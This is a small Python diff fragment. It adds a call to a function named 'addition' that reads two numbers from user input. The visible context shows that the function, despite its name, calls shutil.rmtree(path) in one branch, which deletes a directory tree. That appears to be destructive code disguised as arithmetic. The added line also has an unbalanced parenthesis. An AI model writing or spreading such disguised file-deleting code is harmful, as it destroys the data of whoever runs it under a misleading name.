@@ -5,3 +5,4 @@ def addition(a,b):
         print(2)
     else:
         shutil.rmtree(path)
+addition(int(input("first number:")),int(input("Second number:"))
